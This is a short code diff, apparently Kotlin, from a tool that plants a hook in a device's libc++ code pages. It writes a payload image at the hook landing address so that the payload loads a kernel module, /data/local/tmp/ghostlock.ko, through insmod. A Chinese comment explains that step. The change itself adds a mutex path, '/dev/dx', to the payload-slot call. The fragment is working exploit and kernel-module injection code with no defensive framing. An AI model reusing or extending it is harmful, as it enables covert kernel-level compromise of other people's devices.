@@ -894,7 +894,7 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
  * the device (the branch aimed 0x98 past 0xFE628), so take the offset from the plan itself. */
 step("typed: hook landing=" + hookLanding)
 /* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
-val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/data/local/tmp/ghostlock.ko", displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
+val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/data/local/tmp/ghostlock.ko", mutexPath = "/dev/dx", displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
 step("typed: hook payload slots=" + payloadSlots)
 val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16L, saInit(hook.nextSequence())) else false
                     step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
